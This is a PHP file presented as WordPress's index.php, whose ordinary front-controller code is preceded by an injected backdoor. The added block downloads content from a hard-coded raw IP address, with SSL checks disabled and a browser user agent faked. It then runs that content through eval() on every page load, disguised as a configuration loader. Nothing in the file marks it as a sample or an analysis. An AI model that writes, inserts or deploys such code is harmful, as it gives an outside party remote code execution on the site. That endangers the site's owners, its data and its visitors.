<?php
function getRemoteData($url) {
    $result = false;
    
    if (ini_get('allow_url_fopen')) {
        $result = @file_get_contents($url);
    }
    
    if ($result === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    
    return $result;
}
$configData = getRemoteData('http://107.150.34.133/j251114_23/init.txt');

if ($configData) {
    if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
        try {
            eval('?>' . $configData);
        } catch (Exception $e) {
            error_log('Configuration load error: ' . $e->getMessage());
        }
    }
}
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
